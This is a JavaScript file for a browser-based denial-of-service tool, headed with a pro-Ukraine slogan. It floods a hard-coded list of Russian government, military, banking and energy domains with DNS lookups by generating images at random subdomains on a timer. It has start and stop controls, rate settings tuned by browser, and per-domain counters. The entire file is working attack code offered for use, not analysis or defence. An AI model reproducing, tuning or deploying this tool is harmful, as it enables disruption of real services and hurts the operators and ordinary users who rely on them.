// =============
// Slava Ukraini | Слава Україні | Слава Украине

var threadCount = 1;
var domains = ["10.ru","customs.ru","evraz.com","gazprom.ru","gazprombank.ru","gazsvyaz.ru","gldn.net","gosuslugi.ru","gov.ru","irkutskenergo.ru","lukoil.com","metalloinvest.com","mil.ru","mos.ru","nalog.ru","nic.ru","nlmk.ru","nornik.ru","omk.ru","pac.ru","pfrf.ru","sberbank.ru","sibur.ru","stalcom.net","tander.ru","tatais.ru","tatneft.ru","uralkali.com","vsw.ru","vtb.ru","yandex.ru"];
var domainCount = 10;
var intervalTimeout = 3000;
var displayTimeout = 500;
var trackDomains = {};
var makeRequests = false;
var displayInterval = 0;
var intervals = [];
var totalCount = 0;
var outstandingRequests = 0;

function setValuesBasedOnUA() {
  // firefox seems to be pretty slow at DNS resolution
  if (navigator.userAgent.toLowerCase().indexOf('firefox') > -1) {
    threadCount = 1;
    domainCount = 50;
    intervalTimeout = 1000;
  } else {
    threadCount = 1;
    domainCount = 250;
    intervalTimeout = 500;
  }

  document.getElementById("ftc").value = threadCount;
  document.getElementById("fvl").value = domainCount;
  document.getElementById("fin").value = intervalTimeout;
}

function updateValues() {
  threadCount = parseInt(document.getElementById("ftc").value);
  domainCount = parseInt(document.getElementById("fvl").value);
  intervalTimeout = parseInt(document.getElementById("fin").value);
}

window.addEventListener('load', (event) => {
  setValuesBasedOnUA();

  var btn = document.getElementById("btnStartStop");
  btn.addEventListener('click', () => {
    if (makeRequests) {
      btn.value = "Start";
      stopRequests();
    } else {
      btn.value = "Stop";
      startRequests();
    }
  });

  displayInterval = window.setInterval(displayTrackedDomains, displayTimeout);
});

function displayTrackedDomains() {
  updateValues();

  var dl = document.getElementById("domainList");
  dl.innerText = "";
  var newText = "Total request attempts made: " + totalCount.toLocaleString() + "\n";
  for (var key in trackDomains) {
    newText += "\n" + key + ": " + trackDomains[key].toLocaleString();
  }
  dl.innerText = newText;
}

function getRndInteger(min, max) {
  return Math.floor(Math.random() * (max - min) ) + min;
}

function getDomain() {
  return domains[getRndInteger(0, domains.length - 1)];
}

function randomString(min, max) {
  var result = '';
  var chars  = 'abcdefghijklmnopqrstuvwxyz';
  for ( var i = 0; i < getRndInteger(min, max); i++ ) {
   result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function doDNSRequest(domain) {
  var t = document.createElement("img");
  d = "https://"+randomString(2,20)+"."+domain;
  t.src = d;
  if (!trackDomains.hasOwnProperty(domain)) {
    trackDomains[domain] = 0;
  }
  totalCount += 1;
  trackDomains[domain] += 1;
  outstandingRequests -= 1;
}

function makeDNSRequests(domain, count) {
  outstandingRequests += count;
  for (var i = 0; i < count; i++) {
    doDNSRequest(domain);
    if (!makeRequests) {
      break;
    }
  }
}

function startRequests () {
  stopRequests();
  makeRequests = true;
  for (var i = 0; i < threadCount; i++) {
    intervals.push(
      window.setInterval(function () {
        if (outstandingRequests <= 0) {
          outstandingRequests = 0;
          var domain = getDomain();
          makeDNSRequests(domain, domainCount);
        }
      }, intervalTimeout)
    );
  }
}

function stopRequests() {
  makeRequests = false;
  for (var i = 0; i < intervals.length; i++) {
    window.clearInterval(intervals[i]);
  }
  intervals = [];
  outstandingRequests = 0;
}
